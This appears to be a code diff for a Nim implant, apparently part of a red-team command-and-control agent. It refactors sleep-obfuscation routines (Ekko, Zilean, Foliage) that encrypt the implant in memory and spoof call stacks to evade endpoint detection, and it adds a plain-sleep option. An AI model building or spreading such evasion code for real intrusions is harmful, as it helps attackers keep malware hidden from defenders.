@@ -125,7 +125,6 @@ proc GetRandomThreadCtx(): CONTEXT =
     Ekko sleep obfuscation based on Timers API using RtlCreateTimer
 ]#
 proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var bool = true) = 
-    
     var 
         status: NTSTATUS = 0
         ctx: array[10, CONTEXT]
@@ -465,8 +464,7 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
 #[
     Foliage sleep obfuscation based on Asynchronous Procedure Calls
 ]#
-proc sleepFoliage*(apis: Apis, key, img: USTRING, sleepDelay: int) = 
-    
+proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) = 
     var 
         status: NTSTATUS = 0
         ctx: array[7, CONTEXT]
@@ -574,7 +572,7 @@ proc sleepFoliage*(apis: Apis, key, img: USTRING, sleepDelay: int) =
         echo protect("[-] "), err.msg
 
 # Sleep obfuscation implemented in various techniques
-proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = ZILEAN, spoofStack: var bool = true) = 
+proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NONE, spoofStack: var bool = true) = 
     
     if sleepDelay == 0: 
         return 
@@ -582,7 +580,7 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = ZILEAN, spoof
     # Initialize required API functions 
     let apis = initApis() 
 
-    echo fmt"[*] Sleepmask settings: Technique: {$mode}, Delay: {$sleepDelay}ms, Stack spoofing: {$spoofStack}"
+    echo fmt"[*] Sleepmask settings: Technique: {$technique}, Delay: {$sleepDelay}ms, Stack spoofing: {$spoofStack}"
 
     var img: USTRING = USTRING(Length: 0)
     var key: USTRING = USTRING(Length: 0)
@@ -602,11 +600,12 @@ proc sleepObfuscate*(sleepDelay: int, mode: SleepObfuscationMode = ZILEAN, spoof
     key.Length = cast[DWORD](keyBuffer.len())
 
     # Execute sleep obfuscation technique
-    case mode:
+    case technique:
     of EKKO: 
         sleepEkko(apis, key, img, sleepDelay, spoofStack)
     of ZILEAN: 
         sleepZilean(apis, key, img, sleepDelay, spoofStack)
     of FOLIAGE:
         sleepFoliage(apis, key, img, sleepDelay)
-    
+    of NONE:
+        sleep(sleepDelay)
